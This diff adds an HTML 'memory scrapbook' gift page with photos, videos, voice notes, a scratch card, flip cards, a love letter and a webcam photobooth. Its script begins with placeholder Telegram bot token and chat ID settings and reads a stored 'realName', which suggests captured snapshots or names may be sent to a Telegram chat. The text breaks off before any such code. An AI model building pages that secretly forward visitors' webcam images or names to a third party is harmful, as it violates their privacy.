@@ -1,0 +1,1298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Our Memory Scrapbook 💖</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Caveat:wght@600;700&family=Allura&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #fdf8f5;
+      background-image: 
+        radial-gradient(#ffd6e0 1px, transparent 1px),
+        radial-gradient(#ffd6e0 1px, #fdf8f5 1px);
+      background-size: 40px 40px;
+      background-position: 0 0, 20px 20px;
+      color: #5c434d;
+      overflow-x: hidden;
+      padding-bottom: 80px;
+    }
+
+    /* Floating ambient elements */
+    .petal {
+      position: fixed;
+      top: -20px;
+      font-size: 20px;
+      opacity: 0.7;
+      animation: fall linear infinite;
+      pointer-events: none;
+      z-index: 100;
+    }
+    .petal:nth-child(1) { left: 8%; animation-duration: 12s; }
+    .petal:nth-child(2) { left: 25%; animation-duration: 9s; }
+    .petal:nth-child(3) { left: 48%; animation-duration: 14s; }
+    .petal:nth-child(4) { left: 68%; animation-duration: 10s; }
+    .petal:nth-child(5) { left: 88%; animation-duration: 13s; }
+
+    @keyframes fall {
+      from { transform: translateY(-10vh) rotate(0deg); }
+      to { transform: translateY(110vh) rotate(360deg); }
+    }
+
+    /* Hero Section */
+    .hero {
+      text-align: center;
+      padding: 50px 20px 20px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .hero-tag {
+      display: inline-block;
+      background: #ffe3ec;
+      color: #ff4f81;
+      padding: 6px 18px;
+      border-radius: 50px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      margin-bottom: 12px;
+      box-shadow: 0 4px 12px rgba(255, 79, 129, 0.15);
+    }
+
+    .hero h1 {
+      font-family: 'Allura', cursive;
+      font-size: 4.5rem;
+      color: #ff4f81;
+      text-shadow: 2px 2px 0px #fff, 4px 4px 0px rgba(255, 182, 193, 0.4);
+      margin-bottom: 10px;
+      line-height: 1.2;
+    }
+
+    .hero p {
+      font-family: 'Caveat', cursive;
+      font-size: 1.6rem;
+      color: #8c6875;
+      max-width: 600px;
+      margin: 0 auto 15px;
+    }
+
+    /* Live Memory Counter */
+    .counter-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      background: #ffffff;
+      padding: 10px 24px;
+      border-radius: 30px;
+      border: 2px solid #ffb3c6;
+      box-shadow: 0 8px 20px rgba(255, 179, 198, 0.25);
+      margin-top: 10px;
+    }
+
+    .counter-item {
+      text-align: center;
+    }
+
+    .counter-number {
+      font-weight: 700;
+      font-size: 1.2rem;
+      color: #ff4f81;
+    }
+
+    .counter-label {
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      color: #a07888;
+      letter-spacing: 1px;
+    }
+
+    .section-title {
+      text-align: center;
+      font-family: 'Caveat', cursive;
+      font-size: 2.3rem;
+      color: #ff4f81;
+      margin-top: 40px;
+    }
+
+    /* SCRAPBOOK COLLAGE CARDS */
+    .scrapbook-board {
+      max-width: 1100px;
+      margin: 20px auto 40px;
+      padding: 20px;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 32px;
+      align-items: center;
+      position: relative;
+      z-index: 2;
+    }
+
+    .scrapbook-item {
+      position: relative;
+      background: #ffffff;
+      padding: 16px 16px 24px;
+      border-radius: 12px;
+      box-shadow: 0 12px 30px rgba(180, 140, 150, 0.18);
+      transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      cursor: pointer;
+    }
+
+    .scrapbook-item:hover {
+      transform: scale(1.06) rotate(0deg) !important;
+      z-index: 50 !important;
+      box-shadow: 0 20px 40px rgba(255, 79, 129, 0.25);
+    }
+
+    .washi-tape {
+      position: absolute;
+      top: -12px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 90px;
+      height: 26px;
+      background: rgba(255, 200, 215, 0.7);
+      border-left: 2px dashed rgba(255, 255, 255, 0.8);
+      border-right: 2px dashed rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(2px);
+      z-index: 5;
+    }
+
+    .tilt-left { transform: rotate(-3.5deg); }
+    .tilt-right { transform: rotate(3deg); }
+    .tilt-far-left { transform: rotate(-6deg); }
+    .tilt-far-right { transform: rotate(5.5deg); }
+
+    .scrapbook-item img {
+      width: 100%;
+      height: 250px;
+      object-fit: cover;
+      border-radius: 8px;
+      display: block;
+    }
+
+    .scrapbook-item .note {
+      font-family: 'Caveat', cursive;
+      font-size: 1.4rem;
+      color: #6e4d58;
+      text-align: center;
+      margin-top: 12px;
+      line-height: 1.2;
+    }
+
+    .badge-stamp {
+      position: absolute;
+      bottom: -12px;
+      right: -10px;
+      background: linear-gradient(135deg, #ff758c, #ff7eb3);
+      color: white;
+      font-size: 0.75rem;
+      font-weight: 700;
+      padding: 6px 12px;
+      border-radius: 20px;
+      box-shadow: 0 4px 10px rgba(255, 117, 140, 0.3);
+      transform: rotate(-8deg);
+    }
+
+    .video-card video {
+      width: 100%;
+      height: 240px;
+      border-radius: 8px;
+      object-fit: cover;
+      background: #ffe6ed;
+    }
+
+    .sticker-decal {
+      position: absolute;
+      font-size: 2.2rem;
+      filter: drop-shadow(2px 4px 6px rgba(0,0,0,0.1));
+      pointer-events: none;
+      z-index: 6;
+    }
+
+    /* FEATURE 1: SCRATCH CARD SECTION */
+    .scratch-section {
+      max-width: 450px;
+      margin: 40px auto;
+      text-align: center;
+      position: relative;
+      z-index: 2;
+      padding: 0 20px;
+    }
+
+    .scratch-card-container {
+      position: relative;
+      width: 100%;
+      height: 280px;
+      margin: 15px auto;
+      border-radius: 18px;
+      overflow: hidden;
+      box-shadow: 0 15px 35px rgba(255, 120, 150, 0.25);
+      border: 4px solid #ffffff;
+      background: #ffffff;
+    }
+
+    .scratch-content {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      background: linear-gradient(135deg, #fff0f5, #ffe3ec);
+    }
+
+    .scratch-content img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      border-radius: 12px;
+    }
+
+    canvas#scratchCanvas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      cursor: pointer;
+      z-index: 10;
+    }
+
+    /* FEATURE 2: 3D FLIP POLAROID CARDS */
+    .flip-section {
+      max-width: 900px;
+      margin: 40px auto;
+      display: flex;
+      justify-content: center;
+      gap: 30px;
+      flex-wrap: wrap;
+      padding: 0 20px;
+    }
+
+    .flip-card {
+      background-color: transparent;
+      width: 260px;
+      height: 320px;
+      perspective: 1000px;
+      cursor: pointer;
+    }
+
+    .flip-card-inner {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      text-align: center;
+      transition: transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      transform-style: preserve-3d;
+      box-shadow: 0 12px 28px rgba(0,0,0,0.1);
+      border-radius: 16px;
+    }
+
+    .flip-card.flipped .flip-card-inner {
+      transform: rotateY(180deg);
+    }
+
+    .flip-card-front, .flip-card-back {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      -webkit-backface-visibility: hidden;
+      backface-visibility: hidden;
+      border-radius: 16px;
+      padding: 16px;
+      background: #ffffff;
+    }
+
+    .flip-card-front img {
+      width: 100%;
+      height: 220px;
+      object-fit: cover;
+      border-radius: 10px;
+    }
+
+    .flip-card-front p {
+      font-family: 'Caveat', cursive;
+      font-size: 1.3rem;
+      color: #8c6875;
+      margin-top: 10px;
+    }
+
+    .flip-card-back {
+      background: linear-gradient(135deg, #ff758c, #ff7eb3);
+      color: white;
+      transform: rotateY(180deg);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .flip-card-back h4 {
+      font-family: 'Allura', cursive;
+      font-size: 2.8rem;
+      margin-bottom: 10px;
+    }
+
+    .flip-card-back p {
+      font-family: 'Caveat', cursive;
+      font-size: 1.4rem;
+      line-height: 1.4;
+    }
+
+    /* MOVING TRAIN FILM-STRIP */
+    .train-section {
+      margin: 60px 0 40px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .train-container {
+      width: 100%;
+      overflow-x: auto;
+      padding: 30px 20px;
+      scroll-behavior: smooth;
+      scrollbar-width: thin;
+      scrollbar-color: #ff9ebb #ffe3ec;
+    }
+
+    .train-track {
+      display: flex;
+      gap: 24px;
+      width: max-content;
+      animation: trainScroll 35s linear infinite;
+    }
+
+    .train-track:hover {
+      animation-play-state: paused;
+    }
+
+    @keyframes trainScroll {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-50%); }
+    }
+
+    .train-box {
+      width: 260px;
+      background: #ffffff;
+      border: 3px solid #ffb3c6;
+      border-radius: 16px;
+      padding: 12px;
+      box-shadow: 0 10px 24px rgba(255, 182, 193, 0.3);
+      position: relative;
+      flex-shrink: 0;
+      transition: transform 0.3s ease;
+    }
+
+    .train-box:hover {
+      transform: translateY(-8px) scale(1.03);
+    }
+
+    .train-box img, .train-box video {
+      width: 100%;
+      height: 200px;
+      object-fit: cover;
+      border-radius: 10px;
+      display: block;
+    }
+
+    .train-box .caption {
+      font-family: 'Caveat', cursive;
+      font-size: 1.3rem;
+      color: #7d5a67;
+      text-align: center;
+      margin-top: 8px;
+    }
+
+    .train-box::after {
+      content: "🚃";
+      position: absolute;
+      right: -24px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 1.2rem;
+      opacity: 0.7;
+    }
+
+    /* Secret Wish Jar */
+    .magic-jar-section {
+      max-width: 750px;
+      margin: 40px auto 20px;
+      background: rgba(255, 255, 255, 0.9);
+      border: 3px dashed #ff9ebb;
+      border-radius: 28px;
+      padding: 35px 25px;
+      text-align: center;
+      box-shadow: 0 16px 36px rgba(255, 182, 193, 0.25);
+      position: relative;
+      z-index: 2;
+    }
+
+    .magic-jar-section h3 {
+      font-family: 'Allura', cursive;
+      font-size: 3rem;
+      color: #ff4f81;
+      margin-bottom: 6px;
+    }
+
+    .jar-btn {
+      margin-top: 16px;
+      padding: 14px 32px;
+      border: none;
+      border-radius: 50px;
+      background: linear-gradient(135deg, #ff4f81, #ff7eb3);
+      color: white;
+      font-size: 1.05rem;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 8px 22px rgba(255, 79, 129, 0.35);
+      transition: all 0.3s ease;
+    }
+
+    .jar-btn:hover {
+      transform: translateY(-3px) scale(1.05);
+    }
+
+    .note-popup {
+      margin-top: 20px;
+      padding: 20px;
+      background: #fff0f4;
+      border-radius: 18px;
+      font-family: 'Caveat', cursive;
+      font-size: 1.6rem;
+      color: #7d4b5a;
+      display: none;
+    }
+
+    /* --- NEW ADDITION 1: LOVE LETTER POPUP MODAL --- */
+    .letter-trigger-section {
+      text-align: center;
+      margin: 40px auto;
+      z-index: 2;
+      position: relative;
+    }
+
+    .envelope-btn {
+      background: #ffffff;
+      border: 2px solid #ff758c;
+      border-radius: 30px;
+      padding: 16px 36px;
+      font-size: 1.1rem;
+      font-family: 'Poppins', sans-serif;
+      font-weight: 600;
+      color: #ff4f81;
+      cursor: pointer;
+      box-shadow: 0 10px 25px rgba(255, 117, 140, 0.25);
+      transition: all 0.3s ease;
+    }
+
+    .envelope-btn:hover {
+      transform: scale(1.05);
+      background: #ffe3ec;
+    }
+
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0,0,0,0.5);
+      backdrop-filter: blur(5px);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 2000;
+    }
+
+    .modal-letter {
+      background: #fff8fa;
+      border: 3px solid #ffb3c6;
+      border-radius: 20px;
+      max-width: 500px;
+      width: 90%;
+      padding: 30px;
+      text-align: center;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.2);
+      position: relative;
+      animation: popUp 0.4s ease-out;
+    }
+
+    @keyframes popUp {
+      from { transform: scale(0.7); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .modal-letter h2 {
+      font-family: 'Allura', cursive;
+      font-size: 3.5rem;
+      color: #ff4f81;
+    }
+
+    .modal-letter p {
+      font-family: 'Caveat', cursive;
+      font-size: 1.5rem;
+      color: #6e4d58;
+      margin: 15px 0;
+      line-height: 1.4;
+    }
+
+    .close-modal-btn {
+      background: #ff4f81;
+      color: white;
+      border: none;
+      padding: 8px 24px;
+      border-radius: 20px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    /* --- NEW ADDITION 2: MEMORY AUDIO VOICE NOTES --- */
+    .audio-notes-section {
+      max-width: 800px;
+      margin: 40px auto;
+      padding: 0 20px;
+      z-index: 2;
+      position: relative;
+    }
+
+    .audio-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 20px;
+      margin-top: 20px;
+    }
+
+    .audio-card {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 20px;
+      border: 2px solid #ffd6e0;
+      box-shadow: 0 8px 20px rgba(255, 179, 198, 0.2);
+      text-align: center;
+    }
+
+    .audio-card h4 {
+      font-family: 'Caveat', cursive;
+      font-size: 1.6rem;
+      color: #ff4f81;
+      margin-bottom: 10px;
+    }
+
+    .audio-card audio {
+      width: 100%;
+      height: 36px;
+      margin-top: 10px;
+    }
+
+    /* --- NEW ADDITION 3: PHOTO BOOTH GENERATOR --- */
+    .photobooth-section {
+      max-width: 600px;
+      margin: 50px auto;
+      background: #ffffff;
+      border: 3px solid #ffb3c6;
+      border-radius: 24px;
+      padding: 30px;
+      text-align: center;
+      box-shadow: 0 15px 35px rgba(255, 182, 193, 0.25);
+      z-index: 2;
+      position: relative;
+    }
+
+    .camera-frame {
+      width: 100%;
+      height: 300px;
+      background: #fff0f4;
+      border: 2px dashed #ff758c;
+      border-radius: 16px;
+      margin: 20px 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .camera-frame video, .camera-frame canvas {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .booth-btn {
+      background: linear-gradient(135deg, #ff758c, #ff7eb3);
+      color: white;
+      border: none;
+      padding: 12px 28px;
+      border-radius: 30px;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 6px 16px rgba(255, 117, 140, 0.3);
+      margin: 5px;
+    }
+
+    /* --- NEW ADDITION 4: TRIVIA / MEMORY QUIZ --- */
+    .quiz-section {
+      max-width: 650px;
+      margin: 50px auto;
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 24px;
+      border: 2px solid #ffb3c6;
+      padding: 30px 25px;
+      box-shadow: 0 12px 30px rgba(255, 182, 193, 0.25);
+      text-align: center;
+      z-index: 2;
+      position: relative;
+    }
+
+    .quiz-opt {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background: #fff0f5;
+      border: 1px solid #ffb3c6;
+      border-radius: 12px;
+      font-family: 'Poppins', sans-serif;
+      font-size: 0.95rem;
+      color: #6e4d58;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .quiz-opt:hover {
+      background: #ffe3ec;
+      transform: translateX(4px);
+    }
+
+    .quiz-feedback {
+      margin-top: 15px;
+      font-family: 'Caveat', cursive;
+      font-size: 1.5rem;
+      font-weight: bold;
+    }
+
+    /* Floating Jukebox Music Selector */
+    .playlist-panel {
+      position: fixed;
+      bottom: 80px;
+      right: 24px;
+      background: #ffffff;
+      border: 2px solid #ffb3c6;
+      border-radius: 16px;
+      padding: 12px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+      display: none;
+      flex-direction: column;
+      gap: 8px;
+      z-index: 1000;
+      width: 200px;
+    }
+
+    .playlist-item {
+      font-size: 0.8rem;
+      padding: 6px 10px;
+      background: #fff0f4;
+      border-radius: 8px;
+      cursor: pointer;
+      color: #7d5a67;
+      font-weight: 500;
+    }
+
+    .playlist-item:hover {
+      background: #ffe3ec;
+      color: #ff4f81;
+    }
+
+    /* Ending Card */
+    .ending {
+      max-width: 750px;
+      margin: 60px auto 30px;
+      text-align: center;
+      padding: 0 20px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .ending-card {
+      background: #ffffff;
+      border-radius: 30px;
+      padding: 40px 30px;
+      box-shadow: 0 18px 40px rgba(255, 182, 193, 0.22);
+      border: 1px solid #ffe3ec;
+    }
+
+    .ending-card h2 {
+      font-family: 'Allura', cursive;
+      font-size: 3.5rem;
+      color: #ff4f81;
+      margin-bottom: 10px;
+    }
+
+    .ending-card p {
+      font-size: 1.05rem;
+      line-height: 1.8;
+      color: #7d5a67;
+      margin-bottom: 24px;
+    }
+
+    .next-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      padding: 16px 36px;
+      border: none;
+      border-radius: 50px;
+      background: linear-gradient(135deg, #ff758c, #ff7eb3);
+      color: white;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 10px 24px rgba(255, 117, 140, 0.3);
+      transition: all 0.3s ease;
+    }
+
+    .next-btn:hover {
+      transform: translateY(-3px) scale(1.04);
+    }
+
+    /* Music Toggle Button */
+    .music-btn {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      z-index: 1000;
+      background: rgba(255, 255, 255, 0.92);
+      border: 1px solid #ffb3c6;
+      padding: 12px 20px;
+      border-radius: 50px;
+      color: #ff4f81;
+      font-weight: 600;
+      font-size: 0.9rem;
+      cursor: pointer;
+      box-shadow: 0 8px 24px rgba(255, 79, 129, 0.2);
+    }
+
+    @media(max-width: 768px) {
+      .hero h1 { font-size: 3.4rem; }
+      .scrapbook-board { grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 24px; }
+      .flip-card { width: 100%; height: 300px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Audio -->
+  <audio id="bgMusic" loop preload="auto">
+    <source id="musicSource" src="music/photograph.mp3" type="audio/mpeg">
+  </audio>
+
+  <!-- Floating Petals -->
+  <div class="petal">🌸</div>
+  <div class="petal">💖</div>
+  <div class="petal">✨</div>
+  <div class="petal">🌷</div>
+  <div class="petal">🎀</div>
+
+  <button id="musicToggle" class="music-btn">🎵 Music: ON</button>
+
+  <!-- Jukebox Playlist Selector Overlay -->
+  <div class="playlist-panel" id="playlistPanel">
+    <div class="playlist-item" onclick="changeTrack('music/photograph.mp3', 'Photograph')">🎶 Photograph</div>
+    <div class="playlist-item" onclick="changeTrack('music/perfect.mp3', 'Perfect')">🎶 Perfect</div>
+    <div class="playlist-item" onclick="changeTrack('music/lover.mp3', 'Lover')">🎶 Lover</div>
+  </div>
+
+  <!-- Hero Header -->
+  <section class="hero">
+    <span class="hero-tag">Scrapbook Memories</span>
+    <h1 id="heroTitle">Every Moment With You ✨</h1>
+    <p>A collection of moments, secrets, and sweet surprises made just for you!</p>
+    
+    <!-- Dynamic Memory Counter -->
+    <div class="counter-badge">
+      <div class="counter-item">
+        <div class="counter-number" id="daysCount">365</div>
+        <div class="counter-label">Days</div>
+      </div>
+      <span style="color:#ffb3c6;">•</span>
+      <div class="counter-item">
+        <div class="counter-number" id="hoursCount">8760</div>
+        <div class="counter-label">Hours</div>
+      </div>
+      <span style="color:#ffb3c6;">•</span>
+      <div class="counter-item">
+        <div class="counter-number">♾️</div>
+        <div class="counter-label">Smiles</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- NEW FEATURE 1: LOVE LETTER TRIGGER BUTTON & MODAL -->
+  <section class="letter-trigger-section">
+    <button class="envelope-btn" onclick="openLetter()">✉️ Open Special Love Letter 💌</button>
+  </section>
+
+  <div class="modal-overlay" id="letterModal">
+    <div class="modal-letter">
+      <h2>Dearest One 💕</h2>
+      <p>
+        "If I had a flower for every time I thought of you... I could walk through my garden forever."
+      </p>
+      <p>
+        Thank you for bringing warmth, color, and laughter into every chapter of my life. This scrapbook is a small keepsake of our big journey together!
+      </p>
+      <button class="close-modal-btn" onclick="closeLetter()">Close Letter ✨</button>
+    </div>
+  </div>
+
+  <!-- SECTION 1: FEATURED CARDS -->
+  <div class="section-title">✨ Featured Scrapbook Cards ✨</div>
+  <section class="scrapbook-board">
+
+    <div class="scrapbook-item tilt-left">
+      <div class="washi-tape"></div>
+      <span class="sticker-decal" style="top:-15px; right:-15px;">🎀</span>
+      <img src="images/1.jpg" alt="Photo 1">
+      <div class="note">"Pure sunshine in human form! ☀️"</div>
+      <span class="badge-stamp">Fav Moment 💕</span>
+    </div>
+
+    <div class="scrapbook-item tilt-right video-card">
+      <div class="washi-tape" style="background: rgba(255,220,180,0.7);"></div>
+      <span class="sticker-decal" style="bottom:-10px; left:-10px;">🎬</span>
+      <video controls poster="images/video-cover.jpg">
+        <source src="videos/memory-video.mp4" type="video/mp4">
+      </video>
+      <div class="note">Press play for pure happiness! 🍿</div>
+    </div>
+
+    <div class="scrapbook-item tilt-far-right">
+      <div class="washi-tape"></div>
+      <span class="sticker-decal" style="top:-18px; left:-10px;">👑</span>
+      <img src="images/photo2.jpg" alt="Photo 2">
+      <div class="note">"Always had that cute sassy glow!"</div>
+      <span class="badge-stamp">Iconic 💫</span>
+    </div>
+
+    <div class="scrapbook-item tilt-far-left">
+      <div class="washi-tape" style="background: rgba(210,240,255,0.7);"></div>
+      <span class="sticker-decal" style="top:-15px; right:-10px;">💖</span>
+      <img src="images/gif1.gif" alt="GIF 1">
+      <div class="note">"Endless giggles & funny vibes 🌸"</div>
+    </div>
+
+    <div class="scrapbook-item tilt-right">
+      <div class="washi-tape"></div>
+      <span class="sticker-decal" style="bottom:-12px; right:-10px;">✨</span>
+      <img src="images/photo3.jpg" alt="Photo 3">
+      <div class="note">"Glowing brighter every single day ✨"</div>
+      <span class="badge-stamp">Lovely 🌷</span>
+    </div>
+
+    <div class="scrapbook-item tilt-left">
+      <div class="washi-tape" style="background: rgba(230,200,255,0.7);"></div>
+      <span class="sticker-decal" style="top:-15px; left:-15px;">🧸</span>
+      <img src="images/photo4.jpg" alt="Photo 4">
+      <div class="note">"Where it all began... cute bundle! 💖"</div>
+    </div>
+
+  </section>
+
+  <!-- NEW FEATURE 2: MEMORY AUDIO VOICE NOTES -->
+  <div class="section-title">🎙️ Play Audio Voice Messages 🎙️</div>
+  <section class="audio-notes-section">
+    <div class="audio-grid">
+      <div class="audio-card">
+        <h4>A Little Message 💖</h4>
+        <p style="font-size:0.8rem; color:#8c6875;">"Listening to your voice always makes my day..."</p>
+        <audio controls>
+          <source src="audio/voicenote1.mp3" type="audio/mpeg">
+        </audio>
+      </div>
+      <div class="audio-card">
+        <h4>Favorite Memory 🌟</h4>
+        <p style="font-size:0.8rem; color:#8c6875;">"Remember that hilarious rainy afternoon?"</p>
+        <audio controls>
+          <source src="audio/voicenote2.mp3" type="audio/mpeg">
+        </audio>
+      </div>
+    </div>
+  </section>
+
+  <!-- SURPRISE FEATURE 1: SCRATCH CARD -->
+  <div class="section-title">🕵️‍♀️ Scratch to Reveal Secret Photo! 🕵️‍♀️</div>
+  <section class="scratch-section">
+    <p style="font-size: 0.95rem; color: #8c6875; margin-bottom: 10px;">Scratch off the silver layer with your finger/mouse to reveal!</p>
+    <div class="scratch-card-container">
+      <div class="scratch-content">
+        <img src="images/photo3.jpg" alt="Secret Photo">
+      </div>
+      <canvas id="scratchCanvas"></canvas>
+    </div>
+  </section>
+
+  <!-- SURPRISE FEATURE 2: 3D FLIP POLAROIDS -->
+  <div class="section-title">💌 Tap a Polaroid to Flip it Over 💌</div>
+  <section class="flip-section">
+    
+    <div class="flip-card" onclick="this.classList.toggle('flipped')">
+      <div class="flip-card-inner">
+        <div class="flip-card-front">
+          <img src="images/1.jpg" alt="Memory">
+          <p>Tap to read secret note ➔</p>
+        </div>
+        <div class="flip-card-back">
+          <h4>Secret Note #1</h4>
+          <p>"You make even the most ordinary days feel like a scene from a movie!"</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="flip-card" onclick="this.classList.toggle('flipped')">
+      <div class="flip-card-inner">
+        <div class="flip-card-front">
+          <img src="images/photo2.jpg" alt="Memory">
+          <p>Tap to read secret note ➔</p>
+        </div>
+        <div class="flip-card-back">
+          <h4>Secret Note #2</h4>
+          <p>"Never forget how capable, brilliant, and wonderful you truly are. ✨"</p>
+        </div>
+      </div>
+    </div>
+
+  </section>
+
+  <!-- NEW FEATURE 3: PHOTO BOOTH GENERATOR -->
+  <div class="section-title">📸 Instant Scrapbook Photobooth 📸</div>
+  <section class="photobooth-section">
+    <p style="font-size:0.9rem; color:#8c6875;">Snap a live Polaroid selfie to add to the scrapbook board!</p>
+    <div class="camera-frame" id="cameraBox">
+      <video id="webcam" autoplay playsinline></video>
+      <canvas id="photoCanvas" style="display:none;"></canvas>
+    </div>
+    <button class="booth-btn" onclick="startCamera()">Start Camera 🎥</button>
+    <button class="booth-btn" onclick="takeSnapshot()">Snap Polaroid 📸</button>
+  </section>
+
+  <!-- NEW FEATURE 4: MEMORY TRIVIA QUIZ -->
+
+  <!-- SECTION 3: MOVING TRAIN FILM-STRIP -->
+  <div class="section-title">🚂 The Express Memory Train 🚂</div>
+  <p style="text-align: center; font-size:0.9rem; color:#8c6875; margin-bottom: 10px;">(Hover/touch any box to pause the train!)</p>
+
+  <section class="train-section">
+    <div class="train-container">
+      <div class="train-track">
+
+        <div class="train-box">
+          <img src="images/1.jpg" alt="Memory">
+          <div class="caption">Cute smile 🌸</div>
+        </div>
+
+        <div class="train-box">
+          <img src="images/sticker1.gif" alt="Animated GIF">
+          <div class="caption">Crazy fun times 🎉</div>
+        </div>
+
+        <div class="train-box">
+          <video controls poster="images/cover2.jpg">
+            <source src="videos/video2.mp4" type="video/mp4">
+          </video>
+          <div class="caption">Mini vlog clip 📹</div>
+        </div>
+
+        <div class="train-box" style="background:#fff0f5;">
+          <img src="images/train2.jpg" alt="Memory">
+          <div class="caption">Star Girl ✨</div>
+        </div>
+
+        <div class="train-box">
+          <img src="images/train3.jpg" alt="Memory">
+          <div class="caption">Unstoppable laughter 😂</div>
+        </div>
+
+        <div class="train-box">
+          <img src="images/dance.gif" alt="GIF">
+          <div class="caption">Dance mood 💃</div>
+        </div>
+
+        <!-- DUPLICATED CARDS FOR SEAMLESS LOOP -->
+        <div class="train-box">
+          <img src="images/1.jpg" alt="Memory">
+          <div class="caption">Cute smile 🌸</div>
+        </div>
+        <div class="train-box">
+          <img src="images/sticker1.gif" alt="Animated GIF">
+          <div class="caption">Crazy fun times 🎉</div>
+        </div>
+        <div class="train-box">
+          <video controls poster="images/cover2.jpg">
+            <source src="videos/video2.mp4" type="video/mp4">
+          </video>
+          <div class="caption">Mini vlog clip 📹</div>
+        </div>
+        <div class="train-box" style="background:#fff0f5;">
+          <img src="images/train2.jpg" alt="Memory">
+          <div class="caption">Star Girl ✨</div>
+        </div>
+        <div class="train-box">
+          <img src="images/train3.jpg" alt="Memory">
+          <div class="caption">Unstoppable laughter 😂</div>
+        </div>
+        <div class="train-box">
+          <img src="images/dance.gif" alt="GIF">
+          <div class="caption">Dance mood 💃</div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- Secret Wish Jar -->
+  <section class="magic-jar-section">
+    <h3>🏺 The Secret Wish Jar</h3>
+    <p style="color: #8c6875;">Click below to pull out a secret handwritten message!</p>
+    <button class="jar-btn" onclick="pullSecretNote()">Pull a Random Note 💌</button>
+    <div class="note-popup" id="wishDisplay"></div>
+  </section>
+
+  <!-- Ending Section -->
+  <section class="ending">
+    <div class="ending-card">
+      <h2>To Infinity & Beyond 🌷</h2>
+      <p>
+        No matter how fast the train moves or how many memories we make, having you in life makes every single moment special! 💖
+      </p>
+      <button class="next-btn" onclick="window.location.href='memory2.html'">
+        Next Chapter Ahead 🚀
+      </button>
+    </div>
+  </section>
+
+  <script>
+    // ==========================================
+    // 0. TELEGRAM BOT CONFIGURATION
+    // ==========================================
+    // Replace these values with your actual Telegram Bot details!
+    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // e.g., '7891234567:AAFx...'
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';     // e.g., '123456789'
+
+    // Personal Title
+    const name = localStorage.getItem('realName') || 'Special One';
+    document.getElementById('heroTitle').innerText = `${name}'s Memory Board ✨`;
+
+    // Dynamic Days Counter (Set your start date below)
+    const startDate = new Date('2023-01-01'); // Change to your preferred date!
+    const now = new Date();
+    const diffTime = Math.abs(now - startDate);
+    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
+    document.getElementById('daysCount').innerText = diffDays;
+    document.getElementById('hoursCount').innerText = diffDays * 24;
+
+    // Audio Player with Autoplay Handling & Jukebox Panel Toggle
+    const music = document.getElementById('bgMusic');
+    const musicBtn = document.getElementById('musicToggle');
+    const playlistPanel = document.getElementById('playlistPanel');
+
+    function startMusic() {
+      music.play().then(() => {
+        musicBtn.innerHTML = '🎵 Music: ON';
+        window.removeEventListener('click', startMusic);
+        window.removeEventListener('touchstart', startMusic);
+      }).catch(() => {});
+    }
+
+    startMusic();
+    window.addEventListener('click', startMusic);
+    window.addEventListener('touchstart', startMusic);
+
+    musicBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      const isVisible = playlistPanel.style.display === 'flex';
+      playlistPanel.style.display = isVisible ? 'none' : 'flex';
+    });
+
+    function changeTrack(src, name) {
+      document.getElementById('musicSource').src = src;
+      music.load();
